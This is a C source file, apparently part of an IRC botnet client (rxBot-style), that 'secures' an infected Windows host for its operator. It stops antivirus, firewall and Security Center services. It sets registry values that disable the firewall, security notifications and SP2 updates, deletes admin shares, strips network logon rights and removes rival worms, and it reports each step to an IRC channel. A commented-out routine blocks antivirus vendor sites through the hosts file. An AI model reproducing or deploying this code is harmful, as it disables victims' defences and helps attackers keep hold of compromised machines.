#include "includes.h"
#include "functions.h"

#ifndef NO_SECURE

char *stoplist[] = { "Tlntsvr",	"RemoteRegistry", "Messenger", "SharedAccess", "wscsvc", "navsvc", "navapsvc", "kavsvc"  };
char *stopnames[]= { "Telnet",	"Remote Registry",	"Messenger", "Windows Firewall/ICS", "Security Center" };

REGENT SecureReg[]={
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"UpdatesDisableNotify",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"AntiVirusDisableNotify",	REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"FirewallDisableNotify",	REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"AntiVirusOverride",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"FirewallOverride",			REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile",			"EnableFirewall",			REG_DWORD,	0x00000000,	0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile",			"EnableFirewall",			REG_DWORD,	0x00000000,	0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update",	"AUOptions",				REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\wscsvc",								"Start",					REG_DWORD,	0x00000004,	0x00000002},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TlntSvr",								"Start",					REG_DWORD,	0x00000004, 0x00000003},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\RemoteRegistry",						"Start",					REG_DWORD,	0x00000004, 0x00000002},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\Messenger",							"Start",					REG_DWORD,	0x00000004, 0x00000004},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Lsa",									"restrictanonymous",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",			"AutoShareWks",				REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",			"AutoShareServer",			REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanworkstation\\parameters",		"AutoShareWks",				REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanworkstation\\parameters",		"AutoShareServer",			REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate",					"DoNotAllowXPSP2",			REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"Software\\Microsoft\\OLE",													"EnableDCOM",				REG_SZ,		0x00000000, 0x00000000, "N", "Y"},
	/*{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1001",				 0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1004",				 0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1200",				 0x00000000, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1809",				 0x00000003, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1001",				 0x00000001, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1004",				 0x00000001, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1200",				 0x00000000, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1809",				 0x00000003, 0x00000000}*/
};

NETSHARES ShareList[]={
	{(LPTSTR)L"IPC$",NULL},
	{(LPTSTR)L"ADMIN$",NULL},
	{(LPTSTR)L"C$",(LPTSTR)L"C:\\"},{(LPTSTR)L"D$",(LPTSTR)L"D:\\"},
	{(LPTSTR)L"E$",(LPTSTR)L"E:\\"},{(LPTSTR)L"F$",(LPTSTR)L"F:\\"},
	{(LPTSTR)L"G$",(LPTSTR)L"G:\\"},{(LPTSTR)L"H$",(LPTSTR)L"H:\\"},
	{(LPTSTR)L"I$",(LPTSTR)L"I:\\"},{(LPTSTR)L"J$",(LPTSTR)L"J:\\"},
	{(LPTSTR)L"J$",(LPTSTR)L"J:\\"},{(LPTSTR)L"K$",(LPTSTR)L"K:\\"},
	{(LPTSTR)L"L$",(LPTSTR)L"L:\\"},{(LPTSTR)L"M$",(LPTSTR)L"M:\\"},
	{(LPTSTR)L"N$",(LPTSTR)L"N:\\"},{(LPTSTR)L"O$",(LPTSTR)L"O:\\"},
	{(LPTSTR)L"P$",(LPTSTR)L"P:\\"},{(LPTSTR)L"Q$",(LPTSTR)L"Q:\\"},
	{(LPTSTR)L"R$",(LPTSTR)L"R:\\"},{(LPTSTR)L"S$",(LPTSTR)L"S:\\"},
	{(LPTSTR)L"T$",(LPTSTR)L"T:\\"},{(LPTSTR)L"U$",(LPTSTR)L"U:\\"},
	{(LPTSTR)L"V$",(LPTSTR)L"V:\\"},{(LPTSTR)L"W$",(LPTSTR)L"W:\\"},
	{(LPTSTR)L"X$",(LPTSTR)L"X:\\"},{(LPTSTR)L"Y$",(LPTSTR)L"Y:\\"},
	{(LPTSTR)L"Z$",(LPTSTR)L"Z:\\"}
};

void SecureRegistry(BOOL secure, void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;

	int written=0,failed=0;
	for(int i=0;i < (sizeof(SecureReg)/sizeof(*SecureReg));i++)
	{
		if (SecureReg[i].type==REG_DWORD)
		{
			if (RegWrite(SecureReg[i].hkey, SecureReg[i].subkey, SecureReg[i].name, (secure?SecureReg[i].data1:SecureReg[i].data2)))
			{
				written++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Set \"%s\\%s\\%s\" to \"%d\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].data1:SecureReg[i].data2));
			}
			else
			{
				failed++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Failed to set \"%s\\%s\\%s\" to \"%d\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].data1:SecureReg[i].data2));
			}
		}
		else if (SecureReg[i].type==REG_SZ)
		{
			written++;
			if (RegWrite(SecureReg[i].hkey, SecureReg[i].subkey, SecureReg[i].name, (secure?SecureReg[i].sdata1:SecureReg[i].sdata2)))
			{
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Set \"%s\\%s\\%s\" to \"%s\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].sdata1:SecureReg[i].sdata2));
			}
			else
			{
				failed++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Failed to set \"%s\\%s\\%s\" to \"%s\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].sdata1:SecureReg[i].sdata2));
			}
		}
	}
	if (written==0)
	{
		if (!verbose && !silent && !loop)
			irc->privmsg(target,"%s Failed to %s Registry. (%.2d/%.2d)",(secure?sec_title:unsec_title),(secure?"secured":"unsecured"),written,failed);
	}
	else
	{
		if (!verbose && !silent && !loop)
			irc->privmsg(target,"%s Registry %s. (%.2d/%.2d)",(secure?sec_title:unsec_title),(secure?"secured":"unsecured"),written,failed);
	}
}

void SecureShares(BOOL secure, void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;
	char sendbuf[IRCLINE];
	char tmpBuffer[IRCLINE];
	int shdel=0;
	int shmake=0;

	if (secure)
	{
		PSHARE_INFO_502 pBuf,p;
		NET_API_STATUS nStatus;
		DWORD entriesread=0,totalread=0,resume=0;
			
		if (!loop && !silent)
			sprintf(sendbuf,"%s Shares %s:",sec_title,"erased");

		do
		{
			nStatus=fNetShareEnum(NULL,502,(LPBYTE *)&pBuf,-1,&entriesread,&totalread,&resume);

			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA)
			{
				p = pBuf;
 
				for(unsigned int i=1;i <= entriesread;i++)
				{
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$')
					{
						if(fNetShareDel(NULL,(unsigned short *)p->shi502_netname,0) == NERR_Success)
						{
							if (!loop && !silent && verbose)
							{
								if (shdel>0)
									strcat(sendbuf,",");
								sprintf(tmpBuffer," %S",p->shi502_netname);
								strcat(sendbuf,tmpBuffer);
							}
							shdel++;
						}
					}
					p++;
				}
				fNetApiBufferFree(pBuf);
			}
			else
			{
				for(int i=0;i < (sizeof(ShareList)/sizeof(*ShareList));i++)
				{
					if(fNetShareDel(NULL,(unsigned short *)ShareList[i].ShareName,0) == NERR_Success)
					{
						if (!loop && !silent && verbose)
						{
							if (shdel>0)
								strcat(sendbuf,",");

							sprintf(tmpBuffer," %S",ShareList[i].ShareName);
							strcat(sendbuf,tmpBuffer);
						}
						shdel++;
					}
				}
			}
		} while (nStatus == ERROR_MORE_DATA);

		if (verbose && !loop && !silent)
		{
			if (shdel==0)
				irc->privmsg(target,"%s No shares %s.",sec_title,"erased");
			else
			{
				sprintf(tmpBuffer," - Total shares %s: %d.","erased",shdel);
				strcat(sendbuf,tmpBuffer);
				irc->privmsg(target,sendbuf);
			}
		}
		else if (!loop && !silent && !verbose)
		{
			if (shdel==0)
				irc->privmsg(target,"%s No shares %s.",sec_title,"erased");
			else
			{
				irc->privmsg(target,"%s Total shares %s: %d.",sec_title,"erased",shdel);
			}
		}

	}
	else
	{ // Unsecure

		if (!loop && !silent)
			sprintf(sendbuf,"%s Shares %s:",unsec_title,"created");

		NET_API_STATUS res;
		SHARE_INFO_2 p;
		DWORD parm_err = 0;
		for (int i=0;i < (sizeof(ShareList) / sizeof (*ShareList));i++)
		{
			p.shi2_netname = (unsigned short *)TEXT(ShareList[i].ShareName);   
			p.shi2_type = STYPE_DISKTREE;
			p.shi2_remark = (unsigned short *)TEXT("rofl");
			p.shi2_permissions = 0;
			p.shi2_max_uses = 4;
			p.shi2_current_uses = 0;
			p.shi2_path = (unsigned short *)TEXT(ShareList[i].SharePath);
			p.shi2_passwd = NULL;
			res=fNetShareAdd(NULL,2,(LPBYTE)&p,&parm_err);
			if(res==0)
			{
				if (!loop && !silent && verbose)
				{
					if (shmake>0)
						strcat(sendbuf,",");

					sprintf(tmpBuffer," %S",ShareList[i].ShareName);
					strcat(sendbuf,tmpBuffer);
				}
				shmake++;
			}
		}
		if (verbose && !loop && !silent)
		{
			if (shmake==0)
				irc->privmsg(target,"%s No shares %s.",unsec_title,"created");
			else
			{
				sprintf(tmpBuffer," - Total shares %s: %d.","created",shmake);
				strcat(sendbuf,tmpBuffer);
				irc->privmsg(target,sendbuf);
			}
		}
		else if (!verbose && !silent && !loop)
		{
			if (shmake==0)
				irc->privmsg(target,"%s No shares %s.",unsec_title,"created");
			else
			{
				irc->privmsg(target,"%s Total shares %s: %d.",unsec_title,"created",shmake);
			}
//			addlog(MAINLOG,sendbuf);
		}
	}
	return;
}

void SecureServices(void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;
	SERVICE_STATUS ssStatus; 
	SC_HANDLE schService;
	SC_HANDLE hServiceControl;
	DWORD fdwAccess; 
	DWORD fdwControl;
	// The required service object access depends on the control. 
	fdwControl = SERVICE_CONTROL_STOP;
	fdwAccess = SERVICE_STOP;
	int stopped=0;
	int stopsize=(sizeof(stoplist)/sizeof(LPTSTR));

//	char sendbuf[IRCLINE];
	for(int x=0;x<stopsize;x++)
	{
 		// Open a handle to the service.
		hServiceControl=fOpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		schService=fOpenService(hServiceControl,stoplist[x],SERVICE_ALL_ACCESS);
		if (schService == NULL)
		{
			DWORD dw = GetLastError();
			if ((int)dw == 1060)
				if (verbose && !loop && !silent)
					irc->privmsg(target,"%s The %s service does not exist.",sec_title,stopnames[x]);
		}
		else
		{ 
			if (fControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
			{
				fControlService(schService, SERVICE_CONTROL_STOP, &ssStatus);
				if (verbose && !loop && !silent)
					irc->privmsg(target,"%s %s service stopped.",sec_title,stopnames[x]);
				stopped++;
			}
			else
			{
				DWORD dw = GetLastError();
				if ((int)dw == 1062)
					if (verbose && !loop && !silent)
						irc->privmsg(target,"%s The %s service was not started.",sec_title,stopnames[x]);

				else
					if (verbose && !loop && !silent)
						irc->privmsg(target,"%s Failed to stop the %s service, error: <%d> %u",sec_title,stopnames[x],dw);
			}
		}
		fCloseServiceHandle(schService);
		fCloseServiceHandle(hServiceControl);
	}
	if (stopped==0)
	{
		if (!loop && !silent && !verbose)
			irc->privmsg(target,"%s No services stopped.",sec_title);
	}
	else
	{
		if (!loop && !silent && !verbose)
			irc->privmsg(target,"%s Total services stopped: %d",sec_title,stopped);
	}
}


DWORD WINAPI SecureThread(LPVOID param)
{
	NTHREAD secure = *((NTHREAD*)param);
	NTHREAD *secures = (NTHREAD *)param;
	secures->gotinfo = TRUE;

	if (secure.bdata2) //loop
	{
		while (1)
		{
			if (!noadvapi32)
			{
#ifndef NO_VIRUSREMOVE
				RemoveVirus(0,NULL,TRUE,TRUE,FALSE);
#endif
				SecureServices(NULL, 0, TRUE, FALSE, TRUE);
				SecureRegistry(TRUE, NULL, 0, TRUE, FALSE, TRUE);
				SecureShares(TRUE, NULL, 0, TRUE, FALSE, TRUE);

#ifndef NO_LSARESTRICT
				if (!noadvapi32lsa)
					SearchForPrivilegedAccounts(L"SeNetworkLogonRight",FALSE);
#endif
			}
			//WriteHostsFile(secure.secure, secure.sock, secure.chan, secure.notice, secure.silent, secure.verbose, secure.loop);
			Sleep(SECURE_DELAY);
		}
	}
	else
	{
		IRC* irc=(IRC*)secure.conn;
		if (!noadvapi32)
		{
			if (secure.bdata1)
			{
				SecureServices(irc,secure.target,secure.silent,secure.verbose,FALSE);
#ifndef NO_VIRUSREMOVE
				//RemoveVirus(secure.target,irc,FALSE,secure.silent,secure.verbose);
#endif
			}

#ifndef NO_LSARESTRICT
			if (!noadvapi32lsa) {
				DWORD dwRet;
				if ((dwRet = SearchForPrivilegedAccounts(L"SeNetworkLogonRight",(secure.bdata1?FALSE:TRUE))) > 0)
					irc->privmsg(secure.target,"%s %s SeNetworkLogonRights %s %d accounts in local system policy.", (secure.bdata1?sec_title:unsec_title), (secure.bdata1?"Removed":"Added"), (secure.bdata1?"from":"to"),dwRet);
				else
					irc->privmsg(secure.target,"%s Failed to %s SeNetworkLogonRights %s accounts in local system policy.",(secure.bdata1?sec_title:unsec_title),(secure.bdata1?"remove":"restore"),(secure.bdata1?"from any":"to"));
			}
#endif

			SecureRegistry(secure.bdata1,irc,secure.target,secure.silent,secure.verbose,FALSE);
			SecureShares(secure.bdata1,irc,secure.target,secure.silent,secure.verbose,FALSE);
		}
			
	}

/*
		} else {
//			sprintf(sendbuf,"%s Advapi32.dll could not be loaded, %s could not be %s.",(secure.secure?sec_title:unsec_title),(secure.secure?"registry, shares, and services":"registry and shares"),(secure.secure?"secured":"unsecured"));
//			if (!secure.silent) irc_privmsg(secure.sock,secure.chan,sendbuf,secure.notice);
//			addlog(MAINLOG,sendbuf);
		}
//		WriteHostsFile(secure.secure, secure.sock, secure.chan, secure.notice, secure.silent, secure.verbose, secure.loop);
	}
*/
	clearthread(secure.threadnum);
	ExitThread(0);
}

#ifndef NO_LSARESTRICT

LPWSTR AccountName[]={
	L"Administrators",
	L"Users"
};

void InitLsaString(PLSA_UNICODE_STRING LsaString, LPWSTR String)
{
	DWORD StringLength;

	if (String == NULL) {
		LsaString->Buffer = NULL;
		LsaString->Length = 0;
		LsaString->MaximumLength = 0;

		return;
	}

	StringLength = wcslen(String);
	LsaString->Buffer = String;
	LsaString->Length = (USHORT) StringLength * sizeof(WCHAR);
	LsaString->MaximumLength=(USHORT)(StringLength+1) * sizeof(WCHAR);

	return;
}

NTSTATUS SetPrivilegeOnAccount(LSA_HANDLE PolicyHandle, PSID AccountSid, LPWSTR PrivilegeName, BOOL bEnable)
{
	LSA_UNICODE_STRING PrivilegeString;
	InitLsaString(&PrivilegeString, PrivilegeName);

	return (bEnable)?(fLsaAddAccountRights(PolicyHandle,AccountSid,&PrivilegeString,1))
		:(fLsaRemoveAccountRights(PolicyHandle,AccountSid,FALSE,&PrivilegeString,1));
}

DWORD AddPrivilegeToAccount(LSA_HANDLE PolicyHandle, LPWSTR AccountName, LPWSTR PrivilegeName)
{
	DWORD total = 0;
	PLSA_TRANSLATED_SID2 ltsTranslatedSID2;
	PLSA_REFERENCED_DOMAIN_LIST lrdlDomainList;
	NTSTATUS ntsResult;

	LSA_UNICODE_STRING lucName;
	InitLsaString(&lucName, AccountName);

	if ((ntsResult = fLsaLookupNames2(PolicyHandle,0,1,&lucName,&lrdlDomainList,&ltsTranslatedSID2)) == ERROR_SUCCESS) {
		if (SetPrivilegeOnAccount(PolicyHandle,ltsTranslatedSID2->Sid,PrivilegeName, TRUE) == ERROR_SUCCESS)
			total++;
	}
	fLsaFreeMemory(ltsTranslatedSID2);
	fLsaFreeMemory(lrdlDomainList);

	return (total);
}

DWORD SearchForPrivilegedAccounts(LPWSTR PrivilegeName, BOOL bEnable)
{
	DWORD count = 0, total = 0;

	static SECURITY_QUALITY_OF_SERVICE sqos = {sizeof SECURITY_QUALITY_OF_SERVICE, SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE};
	static LSA_OBJECT_ATTRIBUTES lsaOA = {sizeof LSA_OBJECT_ATTRIBUTES, NULL, NULL, 0, NULL, &sqos};

	LSA_HANDLE PolicyHandle;
	NTSTATUS nts;
		
	if ((nts = fLsaOpenPolicy(NULL, &lsaOA, GENERIC_ALL | POLICY_VIEW_LOCAL_INFORMATION | POLICY_LOOKUP_NAMES, &PolicyHandle)) == ERROR_SUCCESS) {

		if (bEnable) {
			for (DWORD i=0; i < sizeof(AccountName) / sizeof(LPWSTR); i++)
				total += AddPrivilegeToAccount(PolicyHandle, AccountName[i],PrivilegeName);
		} else {
			void *buffer;

			LSA_UNICODE_STRING PrivilegeString;
			InitLsaString(&PrivilegeString, PrivilegeName);

			if ((nts = fLsaEnumerateAccountsWithUserRight(PolicyHandle, &PrivilegeString, &buffer, &count)) == ERROR_SUCCESS) {
				SID **psidArray = (SID **)buffer;
				for (DWORD i = 0; i < count; ++ i) {
					if (SetPrivilegeOnAccount(PolicyHandle, psidArray[i], PrivilegeName, FALSE) == ERROR_SUCCESS)
						total++;
				}

				if (buffer) fLsaFreeMemory(buffer);
				buffer = NULL;
			}// else
				//addlogv(MAINLOG,"%s Failed to enumerate LSA accounts.",sec_title);
		}

		fLsaClose(PolicyHandle);
	}// else
		//addlogv(MAINLOG,"%s Failed to open LSA system policy.",sec_title);

	return (total);
}

#endif


#ifndef NO_VIRUSREMOVE
const char *runkey1="Software\\Microsoft\\Windows\\CurrentVersion\\Run";

VIRUSES viruses[]=
{
	{HKEY_LOCAL_MACHINE,runkey1,"TaskMon",				"Mydoom.h",		"taskmon.exe"},	
	{HKEY_LOCAL_MACHINE,runkey1,"PandaAVEngine",		"Netsky.r",		"PandaAVEngine.exe"},	
	{HKEY_CURRENT_USER,	runkey1,"sysinfo.exe",			"Bagle.v",		"sysinfo.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"System MScvb",			"Sobig.c",		"mscvb32.exe"},
	{HKEY_CURRENT_USER,	runkey1,"System MScvb",			"Sobig.c",		"mscvb32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"windows auto update",	"W32.Blaster",	"MSBLAST.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"windows auto update",	"W32.Blaster.B","Penis32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Microsoft Inet Xp..",	"W32.Blaster.C","teekids.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"d3dupdate.exe",		"Bagle.a",		"bbeagle.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"ssate.exe",			"Bagle.j",		"irun4.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"ssate.exe",			"Bagle.k",		"winsys.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"rate.exe",				"Bagle.X",		"i11r54n4.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"System MScvb",			"Sobig.c",		"mscvb32.exe"},
	
	/*{HKEY_LOCAL_MACHINE,runkey1,"Mstorage",				"IRC Bot (Spy)","spoolv.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Windows Config",		"IRC Bot (Spy)","antivirus32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Windows User Starter",	"IRC Bot (Spy)","winuser32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"SMK32",				"IRC Bot (SD)",	"SMK32MGR.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"AVP32 uploaderplus",	"IRC Bot (SD)",	"AVP132.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Rofl in the 2k4",		"IRC Bot (SD)",	"rofl.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Dll8d AutoLoader",		"IRC Bot (SD)",	"dll8dsys.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Microsoft DLL Manager","IRC Bot (SD)",	"dllmngr.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Windows Inhjection Process","IRC Bot (SD)","nxmc.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"SysConfig",			"IRC Bot (SD)",	"wincfg32.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Microsoft Synchronization ASST","IRC Bot (SD)","winav.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Configuration Loader",	"IRC Bot",		"filename.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Configuration Loader",	"IRC Bot",		"syswin.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Configuration Loader",	"IRC Bot",		"iexplore.exe"},
	{HKEY_LOCAL_MACHINE,runkey1,"Configuration Loader",	"IRC Bot",		"svhost.exe"},
	{NULL,NULL,NULL,NULL,NULL}*/
};

void RemoveVirus(char *target,void *conn,BOOL loop,BOOL silent,BOOL verbose)
{
	IRC* irc=(IRC*)conn;
	char sysdir[MAX_PATH], virusexecutable[MAX_PATH];
	int viriireg=0,viriikill=0,viriidel=0;
	int viriifound=0;
	int viriisize=(sizeof(viruses)/sizeof(VIRUSES));

	for (unsigned int i=0; i<viriisize; i++)
	{
		char *treg=RegQuery(viruses[i].hkey,viruses[i].subkey,viruses[i].value);
		if (treg)
		{
			viriifound++;
			if (RegDelete(viruses[i].hkey,viruses[i].subkey,viruses[i].value))
			{
				viriireg++;
				if (!loop && !silent && verbose)
					irc->privmsg(target,"%s Removed registry key for virus: %s",sec_title,viruses[i].name);
			}

#ifndef NO_PROCESS
			if (KillProcess(viruses[i].file,0))
			{
				viriikill++;
				if (!loop && !silent && verbose)
					irc->privmsg(target,"%s Killed process for virus: %s",sec_title,viruses[i].name);
			}
#endif
			GetSystemDirectory(sysdir, sizeof(sysdir));
			sprintf(virusexecutable, "%s\\%s", sysdir, viruses[i].file);
			if (DeleteFile(virusexecutable)!=0)
			{
				viriidel++;
				if (!loop && !silent && verbose)
					irc->privmsg(target,"%s Erased executable for virus: %s",sec_title,viruses[i].name);
			}
		}
		else
		{	// Just for the hell of it
			/*if (KillProcess(viruses[i].file,0))
			{
				GetSystemDirectory(sysdir, sizeof(sysdir));
				sprintf(virusexecutable, "%s\\%s", sysdir, viruses[i].file);
				DeleteFile(virusexecutable);
			}
			Sleep(100);*/
		}

	}
	if (viriifound==0)
	{
		if (!loop && !silent)
			irc->privmsg(target,"%s No known viruses.",sec_title);
	}
	else
	{
		if (!loop && !silent)
			irc->privmsg(target,"%s %s known viruses: R:%.2d, K:%.2d, D:%.2d",sec_title,viriifound,viriireg,viriikill,viriidel);
	}
  
	return;
}
#endif // NO_VIRUSREMOVE
#endif // NO_SECURE



/*
#	ifndef NO_HOSTCHANGE
void WriteHostsFile(BOOL secure, SOCKET sock, char *chan, BOOL notice, BOOL silent, BOOL verbose, BOOL loop) {

	char sysdir[MAX_PATH], sendbuf[IRCLINE], tempbuf[128];

	GetSystemDirectory(sysdir, sizeof(sysdir));
	strncat(sysdir, "\\drivers\\etc\\hosts", sizeof(sysdir));

	if (secure) {
		FILE *fp=fopen(sysdir, "r");
	// we dont want to add things twice...
		if(fp) {
			while(fgets(tempbuf, sizeof(tempbuf), fp) && !feof(fp))
				if(strstr(tempbuf, "www.grisoft.com")) {
					fclose(fp);
					if (!loop) {
						sprintf(sendbuf,"%s Hosts file already secured.", sec_title);
						if (verbose) irc_privmsg(sock, chan, sendbuf, FALSE);
//						addlogv(MAINLOG, sendbuf);
					}
					return;
				}
			fclose(fp); 
		} else {
			fp=fopen(sysdir, "w");
			fprintf(fp, "# Copyright (c) 1993-1999 Microsoft Corp.\n#\n");
			fprintf(fp, "# This is a sample LMHOSTS file used by the Microsoft TCP/IP for Windows.\n#\n\n");
			fclose(fp);
		}

		char *blockedlist[]=
		{	// "kaspersky.com","kaspersky-labs.com","www.kaspersky.com",
			// Kapsersky deserves to be left out of the block list...
			"securityresponse.symantec.com","symantec.com","www.sophos.com","sophos.com","www.mcafee.com","mcafee.com",
			"liveupdate.symantecliveupdate.com","liveupdate.symantec.com","customer.symantec.com","rads.mcafee.com",
			"www.viruslist.com","viruslist.com","viruslist.com","f-secure.com","www.f-secure.com","updates.symantec.com",
			"www.symantec.com","www.avp.com","avp.com","www.networkassociates.com","trendmicro.com","www.trendmicro.com",
			"networkassociates.com","www.ca.com","ca.com","mast.mcafee.com","my-etrust.com","www.my-etrust.com",
			"download.mcafee.com","dispatch.mcafee.com","secure.nai.com","nai.com","www.nai.com","update.symantec.com",
			"us.mcafee.com","www.grisoft.com",NULL
		};

		fp = fopen(sysdir, "a");
		if (fp) {
			int t;
			for (t=0;t<90;t++)
				fprintf(fp, "\n");

			for (t=0;blockedlist[t];t++)
				fprintf(fp, "127.0.0.1\t%s\n",blockedlist[t]);

			if (!loop) {
				sprintf(sendbuf,"%s Hosts file secured.", sec_title);
				if (verbose) irc_privmsg(sock, chan, sendbuf, FALSE);
//				addlogv(MAINLOG, sendbuf);
			}
			fclose(fp);
		} else {
			if (!loop) {
				sprintf(sendbuf,"%s Failed to open Hosts file, error: <%d>. (%s)", sec_title, GetLastError(),sysdir);
				if (!silent) irc_privmsg(sock, chan, sendbuf, FALSE);
//				addlog(ERRORLOG, sendbuf);
			}
		}
	} else {
		FILE *fp = fopen(sysdir, "w");
		if (fp) {
			fprintf(fp, "# Copyright (c) 1993-1999 Microsoft Corp.\n#\n");
			fprintf(fp, "# This is a sample LMHOSTS file used by the Microsoft TCP/IP for Windows.\n#\n\n");
			fprintf(fp, "127.0.0.1\tlocalhost\n");
			if (!loop) {
				sprintf(sendbuf,"%s Hosts file unsecured.", unsec_title);
				if (verbose) irc_privmsg(sock, chan, sendbuf, FALSE);
//				addlogv(MAINLOG, sendbuf);
			}
		} else {
			if (!loop) {
				sprintf(sendbuf,"%s Failed to open Hosts file, error: <%s>", unsec_title, GetLastError());
				if (!silent) irc_privmsg(sock, chan, sendbuf, FALSE);
//				addlogv(ERRORLOG, sendbuf);
			}
		}
		fclose(fp); 
	}
	return;
}
#	endif

#endif
*/